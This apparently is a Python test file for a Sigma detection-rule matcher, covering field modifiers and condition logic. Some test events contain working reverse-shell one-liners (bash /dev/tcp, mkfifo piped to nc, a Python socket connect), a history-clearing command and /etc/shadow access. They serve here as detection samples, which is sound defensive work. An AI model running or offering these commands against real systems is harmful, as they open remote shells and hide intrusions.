from __future__ import annotations

from typing import Any

import pytest
from sigma.rule import SigmaRule

from ayudas import regla_desde
from detectionlab.matcher import ErrorMatcher, _compilar, coincide
from detectionlab.reglas import Regla


def _coincide(regla: Regla, **campos: Any) -> bool:
    assert isinstance(regla.sigma, SigmaRule)
    evento = {"timestamp": "2026-11-10T08:00:00.000-0300", "decoder": {"name": "auditd"}, **campos}
    return coincide(regla.sigma, evento)


class TestModificadores:
    def test_igualdad_insensible_a_mayusculas(self) -> None:
        regla = regla_desde("  sel:\n    exe: '/USR/BIN/BASH'\n  condition: sel\n")
        assert _coincide(regla, exe="/usr/bin/bash")
        assert not _coincide(regla, exe="/usr/bin/bash2")

    def test_cased_distingue_mayusculas(self) -> None:
        regla = regla_desde("  sel:\n    exe|cased: '/usr/bin/bash'\n  condition: sel\n")
        assert _coincide(regla, exe="/usr/bin/bash")
        assert not _coincide(regla, exe="/USR/BIN/BASH")

    def test_contains(self) -> None:
        regla = regla_desde("  sel:\n    cmd|contains: '/dev/tcp/'\n  condition: sel\n")
        assert _coincide(regla, cmd="bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
        assert not _coincide(regla, cmd="cat /proc/net/tcp")

    def test_startswith_y_endswith(self) -> None:
        inicio = regla_desde("  sel:\n    ruta|startswith: '/etc/cron'\n  condition: sel\n")
        fin = regla_desde("  sel:\n    exe|endswith: ['/nc', '/ncat']\n  condition: sel\n")
        assert _coincide(inicio, ruta="/etc/cron.d/x")
        assert not _coincide(inicio, ruta="/var/etc/cron.d/x")
        assert _coincide(fin, exe="/usr/bin/ncat")
        assert not _coincide(fin, exe="/usr/bin/nc.traditional")

    def test_contains_all(self) -> None:
        regla = regla_desde(
            "  sel:\n    cmd|contains|all: ['socket', 'connect']\n  condition: sel\n"
        )
        assert _coincide(regla, cmd="s=socket.socket();s.connect(('1.2.3.4',4444))")
        assert not _coincide(regla, cmd="import socket; print(socket.gethostname())")

    def test_regex_y_banderas(self) -> None:
        regla = regla_desde("  sel:\n    cmd|re: 'mkfifo.*\\|\\s*nc\\b'\n  condition: sel\n")
        assert _coincide(regla, cmd="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|nc 1.2.3.4 4444")
        assert not _coincide(regla, cmd="mkfifo /tmp/f")
        insensible = regla_desde("  sel:\n    cmd|re|i: '^history -c$'\n  condition: sel\n")
        assert _coincide(insensible, cmd="HISTORY -C")
        sensible = regla_desde("  sel:\n    cmd|re: '^history -c$'\n  condition: sel\n")
        assert not _coincide(sensible, cmd="HISTORY -C")

    def test_regex_invalida_es_error(self) -> None:
        with pytest.raises(ErrorMatcher, match="inválida"):
            _compilar("(", 0)

    def test_comodines_en_cadena_plana(self) -> None:
        regla = regla_desde("  sel:\n    exe: '/usr/*/python?'\n  condition: sel\n")
        assert _coincide(regla, exe="/usr/bin/python3")
        assert _coincide(regla, exe="/usr/local/bin/python2")
        assert not _coincide(regla, exe="/usr/bin/python")

    def test_comodin_escapado_es_literal(self) -> None:
        regla = regla_desde("  sel:\n    cmd: 'chmod \\* x'\n  condition: sel\n")
        assert _coincide(regla, cmd="chmod * x")
        assert not _coincide(regla, cmd="chmod 755 x")

    def test_numeros_y_comparaciones(self) -> None:
        igual = regla_desde("  sel:\n    uid: 33\n  condition: sel\n")
        assert _coincide(igual, uid="33")
        assert _coincide(igual, uid=33)
        assert not _coincide(igual, uid="330")
        mayor = regla_desde("  sel:\n    pkts|gt: 0\n  condition: sel\n")
        assert _coincide(mayor, pkts=1)
        assert not _coincide(mayor, pkts=0)
        assert not _coincide(mayor, pkts="no-numero")
        for modificador, valor, cumple, falla in (
            ("gte", 10, 10, 9),
            ("lt", 5, 4, 5),
            ("lte", 5, 5, 6),
            ("neq", 7, 8, 7),
        ):
            regla = regla_desde(f"  sel:\n    n|{modificador}: {valor}\n  condition: sel\n")
            assert _coincide(regla, n=cumple)
            assert not _coincide(regla, n=falla)

    def test_booleanos(self) -> None:
        regla = regla_desde("  sel:\n    syn: true\n  condition: sel\n")
        assert _coincide(regla, syn=True)
        assert _coincide(regla, syn="true")
        assert not _coincide(regla, syn=False)

    def test_null_y_exists(self) -> None:
        nulo = regla_desde("  sel:\n    key: null\n  condition: sel\n")
        assert _coincide(nulo, exe="/bin/sh")
        assert _coincide(nulo, key=None)
        assert not _coincide(nulo, key="exec")
        existe = regla_desde("  sel:\n    key|exists: true\n  condition: sel\n")
        assert _coincide(existe, key="exec")
        assert _coincide(existe, key=None)
        assert not _coincide(existe, exe="/bin/sh")
        ausente = regla_desde("  sel:\n    key|exists: false\n  condition: sel\n")
        assert _coincide(ausente, exe="/bin/sh")

    def test_cidr(self) -> None:
        regla = regla_desde("  sel:\n    ip|cidr: ['10.0.0.0/8', '::1/128']\n  condition: sel\n")
        assert _coincide(regla, ip="10.20.30.40")
        assert _coincide(regla, ip="::1")
        assert not _coincide(regla, ip="192.168.1.1")
        assert not _coincide(regla, ip="no-es-ip")

    def test_fieldref(self) -> None:
        regla = regla_desde("  sel:\n    uid|fieldref: euid\n  condition: sel\n")
        assert _coincide(regla, uid="33", euid="33")
        assert not _coincide(regla, uid="33", euid="0")
        assert not _coincide(regla, uid="33")

    def test_base64_y_windash(self) -> None:
        base64 = regla_desde("  sel:\n    cmd|base64: 'hola'\n  condition: sel\n")
        assert _coincide(base64, cmd="aG9sYQ==")
        windash = regla_desde("  sel:\n    cmd|windash|contains: '-foo'\n  condition: sel\n")
        assert _coincide(windash, cmd="x /foo y")
        assert _coincide(windash, cmd="x -foo y")
        assert not _coincide(windash, cmd="x foo y")

    def test_campo_lista_coincide_por_elemento(self) -> None:
        regla = regla_desde(
            "  sel:\n    groups|contains: 'authentication_failed'\n  condition: sel\n"
        )
        assert _coincide(regla, groups=["syslog", "sshd", "authentication_failed"])
        assert not _coincide(regla, groups=["syslog", "sshd"])

    def test_campo_anidado_con_puntos(self) -> None:
        regla = regla_desde("  sel:\n    file.name: '/etc/shadow'\n  condition: sel\n")
        assert _coincide(regla, file={"name": "/etc/shadow"})
        assert not _coincide(regla, file="texto-plano")

    def test_palabras_clave(self) -> None:
        regla = regla_desde("  kw:\n    - 'FAILED su'\n  condition: kw\n")
        assert _coincide(regla, full_log="Nov 10 su[1]: FAILED su for root by www-data")
        assert not _coincide(regla, full_log="Nov 10 su[1]: (to root) dani on pts/1")


class TestCondiciones:
    DETECCIONES = (
        "  sel_a:\n    exe: '/bin/a'\n  sel_b:\n    cmd|contains: 'b'\n  filtro:\n    uid: '0'\n"
    )

    def _regla(self, condicion: str) -> Regla:
        return regla_desde(self.DETECCIONES + f"  condition: {condicion}\n")

    def test_and_or_not(self) -> None:
        regla = self._regla("sel_a and sel_b and not filtro")
        assert _coincide(regla, exe="/bin/a", cmd="xbx", uid="1000")
        assert not _coincide(regla, exe="/bin/a", cmd="xbx", uid="0")
        assert not _coincide(regla, exe="/bin/a", cmd="x", uid="1000")
        cualquiera = self._regla("sel_a or sel_b")
        assert _coincide(cualquiera, exe="/bin/z", cmd="b")

    def test_parentesis(self) -> None:
        regla = self._regla("(sel_a or sel_b) and not filtro")
        assert _coincide(regla, exe="/bin/z", cmd="b", uid="1000")
        assert not _coincide(regla, exe="/bin/z", cmd="b", uid="0")

    def test_uno_de_y_todos_de(self) -> None:
        uno = self._regla("1 of sel_*")
        assert _coincide(uno, exe="/bin/a")
        assert not _coincide(uno, exe="/bin/z", cmd="z")
        todos = self._regla("all of sel_*")
        assert _coincide(todos, exe="/bin/a", cmd="b")
        assert not _coincide(todos, exe="/bin/a", cmd="z")

    def test_uno_de_them(self) -> None:
        regla = self._regla("1 of them")
        assert _coincide(regla, uid="0")
        assert not _coincide(regla, uid="1000")

    def test_varias_condiciones_son_or(self) -> None:
        regla = regla_desde(self.DETECCIONES + "  condition:\n    - sel_a\n    - sel_b\n")
        assert _coincide(regla, exe="/bin/a")
        assert _coincide(regla, cmd="b")
        assert not _coincide(regla, exe="/bin/z")

    def test_seleccion_con_lista_de_mapas_es_or(self) -> None:
        regla = regla_desde(
            "  sel:\n    - exe: '/bin/a'\n      uid: '0'\n    - exe: '/bin/b'\n  condition: sel\n"
        )
        assert _coincide(regla, exe="/bin/a", uid="0")
        assert not _coincide(regla, exe="/bin/a", uid="1")
        assert _coincide(regla, exe="/bin/b", uid="1")
